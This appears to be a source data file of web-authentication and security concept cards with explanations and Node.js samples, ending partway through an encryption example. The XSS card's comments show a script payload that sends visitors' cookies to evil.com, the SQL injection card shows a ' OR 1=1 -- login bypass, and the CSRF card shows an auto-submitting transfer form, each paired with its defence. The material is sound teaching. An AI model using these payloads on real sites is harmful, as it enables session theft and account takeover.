import type { Concept } from "../types";

export const AUTH: Concept[] = [
  {
    id: "auth-jwt",
    cat: "auth",
    title: "JWT Auth",
    one: "Server signs a token with claims; client sends it back to prove identity.",
    why: "Stateless APIs need identity without a session lookup on every request — serverless functions, multiple services, mobile clients. A JWT bundles signed claims (user id, roles, expiry) so any service holding the public verification key can trust it, no shared database required.",
    how: "A JWT is three base64 parts: header (algorithm), payload (claims: sub, exp, role), signature (HMAC with a secret, or RSA/ECDSA with a private key). The server verifies the signature and expiry — tampering with the payload invalidates the signature. The token is NOT encrypted: anyone can read the claims, so never put secrets inside.",
    when: "Use for API-to-API auth, mobile apps, and microservices sharing a verification key. Prefer server sessions for browser apps needing instant revocation — a stolen JWT is valid until it expires, since there's no state to delete. Keep access tokens short-lived (5–15 min) and pair with refresh tokens.",
    ref: "Auth0 Documentation",
    subtopics: [
      { name: "HS256 vs RS256", detail: "HS256 (shared secret) is simple but every verifier holds the signing power; RS256 (private signs, public verifies) lets anyone verify while only the auth server can mint tokens." },
      { name: "Claims", detail: "Standard: sub (who), exp (expiry), iat (issued at), iss/aud (who issued/for whom). Custom: role, tenant. All visible to the client — treat the payload as public." },
      { name: "The revocation problem", detail: "Logout can't delete a JWT — it's stateless. Mitigations: 5-minute expiries, a denylist of jti values, or token versioning (user.tokenVersion bumps invalidate all old tokens)." },
      { name: "Storage discipline", detail: "HttpOnly cookie beats localStorage (XSS-proof). If the client must hold it, in-memory + silent refresh. alg: none and key-confusion attacks are why you pin the algorithm on verify." },
    ],
    code: `const crypto = require("crypto");

// Minimal HMAC JWT — real apps use jsonwebtoken/jose (verified edge cases handled)
const b64url = (buf) => Buffer.from(buf).toString("base64url");

function sign(payload, secret, ttlSec = 900) {
  const header = b64url(JSON.stringify({ alg: "HS256", typ: "JWT" }));
  const body = b64url(
    JSON.stringify({ ...payload, iat: Math.floor(Date.now() / 1000), exp: Math.floor(Date.now() / 1000) + ttlSec })
  );
  const sig = crypto
    .createHmac("sha256", secret)
    .update(header + "." + body)
    .digest("base64url");
  return header + "." + body + "." + sig;
}

function verify(token, secret) {
  const [h, p, sig] = token.split(".");
  const expected = crypto.createHmac("sha256", secret).update(h + "." + p).digest("base64url");
  const a = Buffer.from(sig), b = Buffer.from(expected);
  if (a.length !== b.length || !crypto.timingSafeEqual(a, b)) throw new Error("bad signature");
  const claims = JSON.parse(Buffer.from(p, "base64url").toString());
  if (claims.exp * 1000 < Date.now()) throw new Error("token expired");
  return claims; // { sub: "u1", role: "admin", exp: ... }
}

const token = sign({ sub: "u1", role: "admin" }, process.env.JWT_SECRET);
console.log(verify(token, process.env.JWT_SECRET).sub); // u1
// try { verify(token, "wrong-secret") } catch (e) { console.log(e.message); }`,
    steps: ["Login", "Server signs JWT", "Client stores token", "Sent on each request", "Server verifies signature"],
  },
  {
    id: "auth-oauth",
    cat: "auth",
    title: "OAuth2",
    one: "Log in with Google or GitHub — a third party vouches for the user's identity.",
    why: "You should never store passwords you don't have to. OAuth2 delegates identity (and scope-limited API access) to providers who already secure it: no password DB to leak, MFA and breach detection inherited for free, and users trust the flow.",
    how: "Authorization Code flow: your app redirects to the provider with a client_id, redirect_uri, state (CSRF nonce), and requested scopes. The user logs in THERE and approves. The provider redirects back with a one-time code; your server exchanges the code for tokens using client_secret, then calls the userinfo endpoint to identify the user.",
    when: "Use for third-party login (Google/GitHub), accessing provider APIs on the user's behalf, and enterprise SSO. For your own first-party logins, simple sessions or JWTs are enough — OAuth adds a redirect dance and a provider dependency for no benefit when there's no third party.",
    ref: "OAuth.net Documentation",
    subtopics: [
      { name: "The state parameter", detail: "A random value sent at redirect start and verified on return — it's what stops an attacker from initiating a login with THEIR account and hijacking your session (login CSRF)." },
      { name: "Code, not tokens, in URLs", detail: "The redirect carries a short-lived code, never tokens. Codes die on first use at the token endpoint (which requires client_secret) — tokens in fragments leak via referrer/history." },
      { name: "PKCE", detail: "The code is bound to a challenge the client proved (code_verifier). Mandatory for SPAs/mobile where no secret can be stored — and now recommended everywhere." },
      { name: "Account linking", detail: "Match the provider identity to a local user by (provider, provider_user_id), never by email alone — emails change and unverified emails enable account takeover." },
    ],
    code: `const crypto = require("crypto");

// 1. "Login with GitHub" — start the flow
app.get("/auth/github", (req, res) => {
  const state = crypto.randomBytes(16).toString("hex");
  req.session.oauthState = state; // CSRF protection: must match on return
  const url = new URL("https://github.com/login/oauth/authorize");
  url.searchParams.set("client_id", process.env.GH_CLIENT_ID);
  url.searchParams.set("redirect_uri", "https://app.example.com/auth/github/callback");
  url.searchParams.set("scope", "read:user user:email");
  url.searchParams.set("state", state);
  res.redirect(url.toString());
});

// 2. Callback — exchange code for token, then identify the user
app.get("/auth/github/callback", async (req, res) => {
  if (req.query.state !== req.session.oauthState) return res.status(403).send("state mismatch");

  const tokenRes = await fetch("https://github.com/login/oauth/access_token", {
    method: "POST",
    headers: { Accept: "application/json", "Content-Type": "application/json" },
    body: JSON.stringify({
      client_id: process.env.GH_CLIENT_ID,
      client_secret: process.env.GH_CLIENT_SECRET, // server-side only
      code: req.query.code,
      redirect_uri: "https://app.example.com/auth/github/callback",
    }),
  });
  const { access_token } = await tokenRes.json();

  const user = await fetch("https://api.github.com/user", {
    headers: { Authorization: "Bearer " + access_token },
  }).then((r) => r.json());

  // link by stable provider id, never by email
  const local = await upsertUser({ provider: "github", providerId: String(user.id), name: user.login });
  req.session.userId = local.id;
  res.redirect("/dashboard");
});`,
    steps: ["Click 'Login with X'", "Redirect to X", "User approves", "X returns code", "App exchanges for token"],
  },
  {
    id: "auth-rbac",
    cat: "auth",
    title: "RBAC",
    one: "Permissions attach to roles, not individual users — assign a role, inherit its access.",
    why: "Granting permissions user-by-user collapses at 50 users: who can approve refunds? Nobody knows. RBAC defines the answer once (roles have permissions, users have roles) — audits, onboarding, and offboarding become single-role assignments instead of permission archaeology.",
    how: "Three entities: users, roles, permissions. A middleware resolves the user's roles once, then every guarded route checks hasPermission(user, 'orders.refund'). Hierarchies (admin ⊃ manager ⊃ viewer) reduce duplication; the check itself is a cheap set lookup.",
    when: "Use when access follows job functions — most business apps. Outgrow it when access depends on specific attributes or relationships (editor of THIS document, owner of THIS project): that's ABAC or relationship-based (ReBAC) territory. Keep permission granularity coarse; 500 permissions is unmaintainable.",
    ref: "NIST",
    subtopics: [
      { name: "Role vs permission checks", detail: "Check permissions, not roles: if (can(user, 'orders.refund')) survives role renames and recomposition; if (role === 'manager') fossilizes." },
      { name: "Hierarchies", detail: "Admin inherits everything below. One level of inheritance usually suffices — deep hierarchies make 'what CAN this role do' unanswerable without tooling." },
      { name: "Deny rules", detail: "RBAC is additive by default (roles only grant). A single deny-overrides-grant exception usually means the model is wrong — split the role instead." },
      { name: "JWT claims for roles", detail: "Embed roles/permissions in the token for stateless checks at the edge, with the trade-off that role changes propagate only when tokens refresh." },
    ],
    code: `// Permissions are the atomic unit; roles are named bundles
const PERMISSIONS = ["orders.read", "orders.refund", "users.manage", "reports.view"];

const ROLES = {
  viewer: ["orders.read", "reports.view"],
  support: ["orders.read", "orders.refund"],
  admin: [...PERMISSIONS],
};

// Effective permissions = union of the user's roles
function permissionsFor(user) {
  return new Set(user.roles.flatMap((r) => ROLES[r] ?? []));
}

const can = (user, permission) => permissionsFor(user).has(permission);

// Guard middleware — checks the permission, not the role
function require(permission) {
  return (req, res, next) => {
    if (!req.user) return res.status(401).json({ error: { code: "unauthenticated" } });
    if (!can(req.user, permission)) {
      return res.status(403).json({ error: { code: "forbidden", need: permission } });
    }
    next();
  };
}

app.post("/orders/:id/refund", require("orders.refund"), refundHandler);

// Usage in templates/UI
const user = { roles: ["support"] };
console.log(can(user, "orders.refund")); // true
console.log(can(user, "users.manage"));  // false`,
    steps: ["User", "Assigned role", "Role has permissions", "Access granted or denied"],
  },
  {
    id: "auth-hashing",
    cat: "auth",
    title: "Password Hashing",
    one: "Storing a one-way scrambled version of a password, never the plain text.",
    why: "When your DB leaks — and at scale it eventually does — the password table decides whether every user is burned everywhere. One-way, deliberately slow hashes make cracking economically infeasible; plain text or fast hashes (SHA-256) make it trivial.",
    how: "Algorithms like bcrypt/argon2/scrypt embed a random salt per password (same password → different hashes, killing rainbow tables) and are parameterized to take ~100ms of CPU. On login, you hash the attempt with the same parameters and timing-safe compare — the hash never gets 'decrypted'.",
    when: "Always, for every password, no exceptions. Use argon2id (or bcrypt with cost ≥ 12) via a maintained library. Rate-limit login endpoints too — hashing cost protects offline cracks; throttling protects online guessing. Never truncate, uppercase, or trim passwords before hashing beyond what the user typed.",
    ref: "OWASP",
    subtopics: [
      { name: "Why not SHA-256", detail: "SHA-256 computes billions/second on GPUs — an 8-character password falls in minutes. Password hashes are deliberately memory/time-hard: ~100ms each, by design." },
      { name: "Salt per password", detail: "Random 16+ bytes stored alongside the hash. Identical passwords produce different hashes — precomputed tables become useless." },
      { name: "Pepper (optional)", detail: "A secret added outside the DB (env/vault), so a DB-only leak can't even start cracking. Adds ops burden: rotating it re-hashes everything." },
      { name: "Rehash on login", detail: "Parameters ratchet up over time (bcrypt 10 → 12). On successful login, if the stored cost is below current policy, re-hash and update — the upgrade rides logins." },
    ],
    code: `const crypto = require("crypto");
const { promisify } = require("util");
const scrypt = promisify(crypto.scrypt);

// OWASP-aligned params: N=2^15, r=8, p=1, 32-byte key (~100ms on a laptop)
const PARAMS = { N: 1 << 15, r: 8, p: 1, keylen: 32 };

async function hashPassword(password) {
  const salt = crypto.randomBytes(16);
  const derived = await scrypt(password, salt, PARAMS.keylen, PARAMS);
  // store everything needed to verify later — parameters travel WITH the hash
  return "scrypt$" + PARAMS.N + "$" + PARAMS.r + "$" + PARAMS.p + "$"
    + salt.toString("hex") + "$" + derived.toString("hex");
}

async function verifyPassword(password, stored) {
  const [alg, N, r, p, saltHex, hashHex] = stored.split("$");
  const derived = await scrypt(password, Buffer.from(saltHex, "hex"), hashHex.length / 2, {
    N: Number(N), r: Number(r), p: Number(p),
  });
  const a = Buffer.from(derived), b = Buffer.from(hashHex, "hex");
  return a.length === b.length && crypto.timingSafeEqual(a, b); // constant-time compare
}

// Register
const stored = await hashPassword("correct horse battery staple");
await db.users.insert({ email: "ada@example.com", password: stored });

// Login
console.log(await verifyPassword("correct horse battery staple", stored)); // true
console.log(await verifyPassword("wrong password", stored));               // false`,
    steps: ["Password entered", "Hashed with salt", "Hash stored", "Login re-hashes & compares"],
  },
  {
    id: "auth-sessionauth",
    cat: "auth",
    title: "Session-Based Auth",
    one: "Server stores session state; the client holds only a session ID cookie.",
    why: "The classic web auth: instant logout, instant ban, small cookies, and zero crypto in the request path. For browser-first apps it remains the most controllable option — the server decides, per request, who is logged in.",
    how: "Login creates a server-side record (memory/Redis/DB) keyed by a cryptographically random ID, delivered in an HttpOnly cookie. Each request looks up the record: valid and unexpired → authenticated. Logout or ban deletes the record — every other tab and device is logged out immediately.",
    when: "Default for server-rendered and cookie-friendly browser apps. Less ideal for native mobile and distributed APIs (every service needs the session store) — that's JWT territory. Scale note: keep the store shared (Redis), not per-process memory, or load balancers desync logins.",
    ref: "OWASP",
    subtopics: [
      { name: "Revocation is a delete", detail: "The killer feature vs JWTs: password change deletes all sessions for that user; support can kill a hijacked session mid-attack. Nothing propagates." },
      { name: "Hardening cookies", detail: "HttpOnly (no JS theft), Secure (HTTPS only), SameSite=Lax (kills most CSRF), and rotation on privilege change (session fixation defense)." },
      { name: "Store choice", detail: "Redis with TTL = expiry for free and O(1) lookups at millions of sessions. DB-backed sessions survive Redis restarts but add a query per request." },
      { name: "Idle vs absolute expiry", detail: "Idle timeout (refreshed per request, e.g. 30 min) + absolute cap (24h, unrenewable) balances convenience against a hijacked-forever session." },
    ],
    code: `const crypto = require("crypto");

const sessions = new Map(); // production: Redis with EX TTL

app.post("/login", express.json(), async (req, res) => {
  const user = await verifyCredentials(req.body.email, req.body.password);
  if (!user) return res.status(401).json({ error: { code: "bad_credentials" } });

  const sid = crypto.randomBytes(32).toString("hex"); // opaque — nothing to decode
  sessions.set(sid, {
    userId: user.id,
    createdAt: Date.now(),
    absoluteExpiry: Date.now() + 24 * 3600 * 1000, // hard cap
    idleExpiry: Date.now() + 30 * 60 * 1000,       // sliding
  });

  res.cookie("sid", sid, { httpOnly: true, secure: true, sameSite: "lax", path: "/" });
  res.json({ data: { id: user.id } });
});

// Resolution middleware — sliding idle window inside an absolute cap
function requireSession(req, res, next) {
  const s = sessions.get(req.cookies.sid);
  const now = Date.now();
  if (!s || now > s.absoluteExpiry || now > s.idleExpiry) {
    sessions.delete(req.cookies.sid);
    return res.status(401).json({ error: { code: "session_expired" } });
  }
  s.idleExpiry = now + 30 * 60 * 1000; // activity extends the session
  req.userId = s.userId;
  next();
}

// Password changed? kill every session for that user, everywhere
function revokeAllFor(userId) {
  for (const [sid, s] of sessions) if (s.userId === userId) sessions.delete(sid);
}`,
    steps: ["Login succeeds", "Session stored server-side", "ID sent as cookie", "Lookup on each request"],
  },
  {
    id: "auth-sso",
    cat: "auth",
    title: "SSO (Single Sign-On)",
    one: "Log in once, gain access to multiple connected applications.",
    why: "Every separate login is a separate attack surface, a separate password reset flow, and a separate offboarding risk — ex-employees with live accounts are a top breach vector. SSO centralizes identity: one login, one policy, one place to revoke everything.",
    how: "An identity provider (IdP — Okta, Auth0, Keycloak) owns authentication. Apps redirect unauthenticated users to the IdP (via OIDC or SAML); the IdP authenticates and returns a signed assertion/token. Apps verify the signature against the IdP's public keys and create a local session. The IdP's session cookie means the next app skips login entirely.",
    when: "Use whenever you have more than one app, or B2B customers with their own identity systems (SAML/enterprise SSO is a sales prerequisite). For a single small app it's pure overhead — a plain session does the job.",
    ref: "Auth0 Documentation",
    subtopics: [
      { name: "OIDC on top of OAuth2", detail: "OAuth2 authorizes access; OIDC adds the identity layer: an id_token (JWT) with who the user is, signed by the IdP, verified by your app." },
      { name: "SAML for enterprises", detail: "XML assertions, 2005-vintage, clunky — but every corporate IdP speaks it. B2B products end up supporting both SAML and OIDC." },
      { name: "IdP-initiated vs SP-initiated", detail: "SP-initiated (app → IdP) is the safe default. IdP-initiated responses (unsolicited assertions) are a known relay/CSRF vector — disable them unless you specifically need them." },
      { name: "Global logout illusion", detail: "Single logout is best-effort: apps can receive a logout notice, but stale local sessions persist. Cap local session lifetime; never trust 'logged out at IdP' alone." },
    ],
    code: `// OIDC-style SSO: every app trusts the IdP's signed id_token
const idpPublicKeys = await fetchIdpJwks(); // cached from https://idp.example.com/.well-known/jwks.json

// App redirects to the IdP — user may already have an IdP session (that's the SSO magic)
app.get("/login", (req, res) => {
  const state = crypto.randomBytes(16).toString("hex");
  req.session.oidcState = state;
  res.redirect(
    "https://idp.example.com/authorize" +
      "?response_type=code&client_id=" + process.env.OIDC_CLIENT_ID +
      "&redirect_uri=https://app-b.example.com/callback" +
      "&scope=openid email&state=" + state
  );
});

// Callback: verify the IdP's signature — trust comes from crypto, not network location
app.get("/callback", async (req, res) => {
  if (req.query.state !== req.session.oidcState) return res.status(403).end();

  const { id_token } = await exchangeCodeForTokens(req.query.code);
  const claims = verifyJwt(id_token, idpPublicKeys); // checks iss, aud, exp, signature
  if (claims.iss !== "https://idp.example.com") throw new Error("wrong issuer");

  req.session.userId = claims.sub; // same sub across every SSO-connected app
  res.redirect("/");
});

// App B never saw a password — the IdP's cookie made this login one click.`,
    steps: ["Login at identity provider", "Token issued", "App A trusts token", "App B trusts same token"],
  },
  {
    id: "auth-mfa",
    cat: "auth",
    title: "MFA",
    one: "A second proof of identity required beyond just a password.",
    why: "Password databases leak and humans reuse passwords — phishing a single factor is an industry. A second, physically-held factor breaks the chain: a leaked password alone no longer grants access, stopping the bulk of automated account takeover.",
    how: "Something you know (password) + something you have (phone, security key) or are (biometric). TOTP apps generate 30-second codes from a shared seed; WebAuthn/passkeys use a hardware-backed keypair that never leaves the device and is origin-bound (phishing sites can't relay it).",
    when: "Require it for admins and anyone touching money or data exports. Offer it to everyone (TOTP), and prefer passkeys where your user base supports them. Enforce rather than nag for privileged roles — opt-in MFA on admins protects nobody who ignores the prompt.",
    ref: "OWASP",
    subtopics: [
      { name: "TOTP apps", detail: "RFC 6238: seed stored as QR, 6 digits rotating every 30s. Server compares the current window (+/-1 for clock drift) with a timing-safe compare." },
      { name: "Passkeys/WebAuthn", detail: "The strongest common option: private key in secure hardware, signed challenge per login, bound to your domain. Immune to phishing and to server password leaks." },
      { name: "SMS is the weakest", detail: "SIM-swap attacks and SS7 interception make SMS factorable. Better than nothing for at-risk users, but not for admins." },
      { name: "Recovery codes", detail: "MFA without recovery locks users out of their lives. Issue 8-10 one-time codes at enrollment, hash them like passwords, and make re-enrollment a support journey." },
    ],
    code: `const crypto = require("crypto");

// TOTP: RFC 4226/6238 in ~30 lines
function base32Decode(s) {
  const A = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
  let bits = 0, value = 0, out = [];
  for (const c of s.replace(/=+$/, "")) {
    value = (value << 5) | A.indexOf(c);
    bits += 5;
    if (bits >= 8) out.push((value >>> (bits - 8)) & 0xff), (bits -= 8);
  }
  return Buffer.from(out);
}

function totp(secretBase32, step = 30, digits = 6, t = Math.floor(Date.now() / 1000)) {
  const counter = Buffer.alloc(8);
  counter.writeUInt32BE(Math.floor(t / step), 4);
  const hmac = crypto.createHmac("sha1", base32Decode(secretBase32)).update(counter).digest();
  const offset = hmac[hmac.length - 1] & 0xf;
  const code = ((hmac[offset] & 0x7f) << 24 | hmac[offset + 1] << 16 | hmac[offset + 2] << 8 | hmac[offset + 3]) % 10 ** digits;
  return code.toString().padStart(digits, "0");
}

function verifyTotp(secret, userCode) {
  const now = Math.floor(Date.now() / 1000);
  // allow one step of clock drift — and compare safely
  return [-1, 0, 1].some((d) => {
    const expected = totp(secret, 30, 6, now + d * 30);
    const a = Buffer.from(expected), b = Buffer.from(userCode);
    return a.length === b.length && crypto.timingSafeEqual(a, b);
  });
}

// Login: password correct -> demand the second factor
// if (user.mfaSecret && !verifyTotp(user.mfaSecret, req.body.code)) return 401 { code: "mfa_failed" }`,
    steps: ["Password entered", "Correct", "Second factor requested", "Access granted"],
  },
  {
    id: "auth-csrf",
    cat: "auth",
    title: "CSRF",
    one: "Tricking a logged-in browser into submitting a request it didn't intend.",
    why: "Your bank session lives in a cookie; any tab can make your browser SEND it. evil.com doesn't need to read the response — it just needs your browser to POST a transfer with your cookie attached. That's CSRF: authenticated actions the user never intended.",
    how: "The browser attaches cookies to every matching request, regardless of which tab initiated it. Defenses break the chain somewhere: SameSite=Lax cookies (not sent on cross-site POST), CSRF tokens (attacker can't read the value to include it), or checking Origin/Referer headers server-side.",
    when: "Worry about it whenever auth rides cookies. Token-based APIs (Authorization header) are structurally immune — scripts must attach the header explicitly. Even with tokens, still set SameSite and validate Origin for any cookie-backed flow (remember-me, SSO callbacks).",
    ref: "OWASP",
    subtopics: [
      { name: "Synchronizer token", detail: "Server issues a per-session random token embedded in forms; on submit it compares. evil.com can trigger the submit but cannot read your page's token value (SOP)." },
      { name: "SameSite cookies", detail: "Lax: cookies ride top-level GET navigations only — cross-site POSTs are stripped, killing most CSRF by default. Strict additionally blocks the inbound link case." },
      { name: "Origin checking", detail: "Every state-changing request must carry your own Origin/Referer. Missing or foreign = reject. Cheap, stateless, and catches tokenless JSON APIs too." },
      { name: "GET must stay safe", detail: "If GET /transfer?to=x existed, image tags would weaponize it. All mutations live behind POST/PUT/DELETE — where defenses apply and prefetchers don't wander." },
    ],
    code: `const crypto = require("crypto");

// Issue a token per session, double-submit pattern
function issueCsrf(req, res) {
  const token = crypto.randomBytes(24).toString("hex");
  req.session.csrf = token;
  res.cookie("csrf", token, { sameSite: "strict", secure: true }); // readable by JS for forms
  return token;
}

// Verify on every state-changing request
function csrfGuard(req, res, next) {
  if (!["POST", "PUT", "PATCH", "DELETE"].includes(req.method)) return next();

  // 1. Origin must match — blocks cross-site no matter what else
  const origin = req.get("origin") ?? req.get("referer");
  if (origin && !origin.startsWith("https://app.example.com")) {
    return res.status(403).json({ error: { code: "csrf_origin" } });
  }

  // 2. Session token must match the submitted token (header or body)
  const sent = req.get("x-csrf-token") ?? req.body?._csrf;
  if (!sent || !req.session?.csrf || sent !== req.session.csrf) {
    return res.status(403).json({ error: { code: "csrf_token" } });
  }
  next();
}

app.use(csrfGuard);

// The attack this stops:
// <form action="https://app.example.com/transfer" method="POST">
//   <input name="to" value="attacker"><input name="amount" value="10000">
// </form><script>document.forms[0].submit()</script>
// -> 403: no valid token, foreign Origin.`,
    steps: ["User logged in elsewhere", "Malicious site triggers request", "Browser auto-sends cookies", "Token check blocks it"],
  },
  {
    id: "auth-xss",
    cat: "auth",
    title: "XSS",
    one: "Injecting malicious script into a page that other users will view.",
    why: "One stored XSS turns every visitor's browser into the attacker's: steal sessions, keylog, deface, mine, worm. It's the most common serious web vuln because it hides in user content — comments, profiles, filenames — and ships whenever output encoding is forgotten once.",
    how: "The app renders untrusted input as HTML/JS without encoding: <script> in a comment executes for every viewer (stored/reflected); a URL fragment written into the DOM executes client-side (DOM-based). The payload then exfiltrates cookies/tokens, impersonates users via fetch, or spreads by writing itself into more content.",
    when: "Assume every user-supplied string is hostile everywhere it's rendered. Frameworks (React/Vue) auto-encode text nodes — the holes are the escape hatches: dangerouslySetInnerHTML, v-html, markdown renderers, admin-only fields (admins get XSSed too). Defense in depth: encode + sanitize + CSP.",
    ref: "OWASP",
    subtopics: [
      { name: "Context matters", detail: "Encoding differs by sink: HTML body (&lt;), attribute (&quot;), JS string (\\u003c), URL (encodeURIComponent). A value safe in one context is live in another." },
      { name: "Sanitizers", detail: "When raw HTML is required (user markdown), pass it through DOMPurify — an allowlist parser that strips event handlers, javascript: URLs, and nested tricks." },
      { name: "HttpOnly limits blast radius", detail: "XSS can't read HttpOnly cookies — but it doesn't need to: it runs AS the user, calling your API with their credentials. XSS is session takeover regardless." },
      { name: "CSP as a net", detail: "Content-Security-Policy: script-src 'self' blocks injected inline scripts even when encoding fails. Nonces/hashes for your legit inline scripts; report-uri to find attempts." },
    ],
    code: `// The bug: user content rendered as raw HTML
app.get("/comments", (req, res) => {
  const comments = db.comments.all();
  // BAD:  res.send(comments.map(c => "<div>" + c.text + "</div>").join(""));
  // A comment of <script>fetch('https://evil.com?c='+document.cookie)</script>
  // now runs for EVERY visitor.

  // GOOD: escape everything before it touches HTML
  const escapeHtml = (s) =>
    String(s).replace(/[&<>"']/g, (ch) =>
      ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[ch])
    );
  res.send(comments.map((c) => "<div>" + escapeHtml(c.text) + "</div>").join(""));
});

// When you genuinely must render user HTML (markdown -> HTML):
const DOMPurify = require("dompurify");
const { JSDOM } = require("jsdom");
const clean = DOMPurify(new JSDOM("").window).sanitize(dirtyHtml, {
  ALLOWED_TAGS: ["p", "b", "i", "a", "code", "pre"],
  ALLOWED_ATTR: ["href"],
}); // <script> and onclick= are gone

// Backstop: a CSP that stops injected scripts from running at all
app.use((req, res, next) => {
  res.set(
    "Content-Security-Policy",
    "default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'none'"
  );
  next();
});`,
    steps: ["Unescaped input rendered", "Script executes in victim's browser", "Data exfiltrated", "Prevented by sanitizing output"],
  },
  {
    id: "auth-sqlinjection",
    cat: "auth",
    title: "SQL Injection",
    one: "Malicious input that alters an unescaped database query.",
    why: "The oldest, most destructive vuln class still alive: user input concatenated into SQL changes what the query MEANS — read any table, bypass logins (' OR 1=1 --), drop data. It survives because string-building SQL is so easy to write once.",
    how: "The query and its data travel as one string, so data containing SQL syntax executes as SQL. Parameterized queries fix it structurally: the driver sends the query shape and values separately — the database parses the shape first and can never reinterpret a value as syntax.",
    when: "Parameterize every query containing any user-influenced value, forever. Dynamic pieces that CAN'T be parameters (table names, ORDER BY columns) come from allowlists, never from input. ORMs parameterize by default — the holes are raw query escapes (sequelize.literal, $queryRaw) and report builders.",
    ref: "OWASP",
    subtopics: [
      { name: "Parameters vs concatenation", detail: "WHERE email = $1 sends the value out-of-band. The planner binds it after parsing — quotes inside the value are data, never syntax." },
      { name: "Identifiers can't be parameters", detail: "ORDER BY $1 is legal but orders by a constant. Sortable columns come from a Map allowlist: {name: 'name', price: 'price_cents'}[req.query.sort]." },
      { name: "Escaping is a last resort", detail: "Manual escaping depends on knowing every context and charset trick (GBK multibyte quotes). It's why pg.escapeLiteral exists and why you should still prefer parameters." },
      { name: "Least privilege limits damage", detail: "The app's DB user should not own the schema. A breach that can only SELECT/INSERT on specific tables is an incident; one that can DROP is an obituary." },
    ],
    code: `// VULNERABLE: input becomes code
app.get("/login", async (req, res) => {
  const q = "SELECT * FROM users WHERE email = '" + req.query.email + "' AND pw = '" + req.query.pw + "'";
  // email = ' OR 1=1 --  ->  SELECT * FROM users WHERE email = '' OR 1=1 --' AND pw = '...'
  const { rows } = await pool.query(q);
  if (rows.length) req.session.userId = rows[0].id; // logged in as whoever
});

// SAFE: the value can never change the query's meaning
app.get("/login", async (req, res) => {
  const { rows } = await pool.query(
    "SELECT * FROM users WHERE email = $1 AND pw_hash = $2",
    [req.query.email, req.query.pw]
  );
});

// Dynamic sorting: allowlist, not interpolation
const SORTABLE = { name: "name", price: "price_cents", newest: "created_at" };
const column = SORTABLE[req.query.sort] ?? "created_at";
const rows2 = await pool.query("SELECT * FROM products ORDER BY " + column + " DESC");

// The ORM default is safe too — these are parameterized:
// prisma.user.findFirst({ where: { email: req.query.email } })
// User.findOne({ where: { email: req.query.email } })`,
    steps: ["Raw input concatenated into query", "Attacker crafts payload", "Query structure changes", "Prevented by parameterized queries"],
  },
  {
    id: "auth-validation",
    cat: "auth",
    title: "Input Validation & Sanitization",
    one: "Checking and cleaning every incoming value before it's trusted.",
    why: "Injection, XSS, and logic bugs all start the same way: data from outside assumed to be well-formed. A validation gate turns 'any garbage the network sends' into 'a known shape with known limits' — the cheapest security control you will ever deploy.",
    how: "Validation decides accept/reject against a schema (types, required, ranges, formats). Sanitization transforms accepted values into safe/normalized form: trimming, stripping control characters, canonicalizing emails/URLs. Order matters: validate raw, then sanitize, then use — and reject rather than 'fix' when the shape is wrong.",
    when: "At every trust boundary: HTTP bodies, query strings, headers, file uploads (extension AND content), queue messages, webhook payloads, env vars at boot. Depth matters too — cap string lengths, array sizes, and nesting depth; unbounded input is a denial-of-service no matter how well-formed.",
    ref: "OWASP",
    subtopics: [
      { name: "Validate type, not just value", detail: "typeof userId === 'string' before regexing it: type confusion (arrays sent as ?a=1&a=2, objects where strings were expected) defeats naive value checks." },
      { name: "Allowlists over denylists", detail: "'^[a-z0-9-]+$' for slugs rejects everything you didn't think of; a blocklist of <script> variants misses the next encoding. Enumerate what IS allowed." },
      { name: "Canonicalize before comparing", detail: "Normalize case/unicode/encoding first (email lowercased, NFC unicode, URL-decoded once) or attackers smuggle past string comparisons with equivalent-but-different forms." },
      { name: "Fail closed, log attempts", detail: "Invalid input = 400 with field errors, nothing partially processed. Log validation failures with context — attack reconnaissance shows up as validation-failure spikes." },
    ],
    code: `const { z } = require("zod");

// The contract: what this endpoint accepts, and nothing more
const RegisterSchema = z.object({
  email: z.string().trim().toLowerCase().email().max(254), // canonicalized + bounded
  password: z.string().min(12).max(128),                   // length limits are security
  displayName: z
    .string()
    .trim()
    .min(1)
    .max(40)
    .regex(/^[\\p{L}\\p{N} '._-]+$/u, "letters, numbers, spaces only"), // allowlist
  role: z.enum(["member"]).default("member"),              // privilege is NEVER client-chosen
});

app.post("/register", express.json({ limit: "16kb" }), (req, res) => {
  const parsed = RegisterSchema.safeParse(req.body);
  if (!parsed.success) {
    log.warn("validation_failed", { ip: req.ip, issues: parsed.error.issues.length });
    return res.status(422).json({
      error: { code: "invalid_input", details: parsed.error.issues.map((i) => i.path.join(".")) },
    });
  }

  const { email, password, displayName, role } = parsed.data; // clean, bounded, safe
  users.create({ email, passwordHash: hash(password), displayName, role });
  res.status(201).json({ data: { email } });
});`,
    steps: ["Input received", "Validated against schema", "Sanitized of unsafe content", "Trusted onward"],
  },
  {
    id: "auth-encryption",
    cat: "auth",
    title: "Encryption at Rest vs in Transit",
    one: "Protecting stored data versus protecting data while it travels.",
    why: "Data is vulnerable in two states: crossing networks anyone can observe, and sitting on disks that get stolen, snapshot, or misconfigured. Each state needs its own protection — TLS in transit, encryption at rest — and neither covers the other.",
    how: "In transit: TLS negotiates ephemeral session keys between endpoints; traffic is unreadable and tamper-proof end to end. At rest: storage-level encryption (AES-256, KMS-managed keys) protects against disk theft and snapshot leaks — but anyone with DB access still sees plaintext, which is why field-level encryption exists for crown jewels.",
    when: "TLS everywhere including internal service traffic; at-rest encryption on by default (it's a checkbox in every cloud DB). Add application/field-level encryption only for regulated secrets (cards, SSNs, health data) that must be unreadable even to DB admins — and accept the query/rotation complexity that brings.",
    ref: "AWS Documentation",
    subtopics: [
      { name: "In transit = TLS", detail: "Protects against network observers and man-in-the-middle: encryption + integrity + server identity via certificates. Internal traffic too — lateral movement is the real threat." },
      { name: "At rest = storage layer", detail: "EBS/RDS/S3 encryption with KMS keys: stolen volumes, snapshots, and backups are opaque. Access to the KMS key is the real security boundary." },
      { name: "Field-level encryption", detail: "The app encrypts specific columns before they reach the DB (libsodium sealed boxes). Admins and dumps see ciphertext — but you can't query what you can't read." },
      { name: "Key management is the game", detail: "Encryption without key discipline is theater: keys in KMS/HSM, rotation policies, separated duties (the DB team shouldn't hold the field keys)." },
    ],
    code: `const crypto = require("crypto");

// FIELD-LEVEL encryption: the DB never sees plaintext for regulated fields
const masterKey = Buffer.from(process.env.FIELD_KEY, "hex"); // from KMS/vault, never in code

function encryptField(plaintext) {
  const iv = crypto.randomBytes(12); // fresh IV every time — never reuse with AES-GCM
